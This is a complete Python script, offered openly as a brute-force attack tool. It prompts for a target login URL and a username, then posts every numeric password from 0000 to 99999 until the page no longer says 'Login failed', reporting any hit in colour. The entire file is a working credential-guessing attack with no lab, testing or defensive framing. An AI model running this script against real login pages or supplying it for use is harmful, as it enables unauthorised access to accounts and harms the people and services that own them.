import requests
from colorama import Fore, Style, init
import time

# Initialize colorama for colored output
init(autoreset=True)

# Function to perform brute-force attack
def brute_force(target_url, username):
    print(Fore.YELLOW + "[*] Starting brute-force attack...")
    start_time = time.time()  # Start timer

    # Define the range of passwords to try (0000 to 99999)
    for password in range(100000):
        # Format the password with leading zeros (e.g., 0000, 0001, ..., 99999)
        formatted_password = f"{password:04}" if password < 10000 else f"{password:05}"
        
        # Prepare the payload for the POST request
        payload = {
            'username': username,
            'password': formatted_password
        }
        
        try:
            # Send a POST request to the target URL
            response = requests.post(target_url, data=payload, timeout=5)
            
            # Check if the login was successful (customize this based on the response)
            if "Login failed" not in response.text:  # Replace with the actual success condition
                print(Fore.GREEN + f"[+] Success! Username: {username}, Password: {formatted_password}")
                print(Fore.GREEN + f"[+] Time taken: {time.time() - start_time:.2f} seconds")
                return  # Stop the script if the password is found
            else:
                print(Fore.RED + f"[-] Failed attempt: Password = {formatted_password}")
        
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Error: {e}")
            continue  # Continue to the next password if an error occurs

    print(Fore.YELLOW + "[*] Brute-force attack completed. No password found.")

# Main program
if __name__ == "__main__":
    # Input target URL and username
    target_url = input("Enter the target URL (e.g., https://example.com/login): ")
    username = input("Enter the username: ")
    
    # Start the brute-force attack
    brute_force(target_url, username)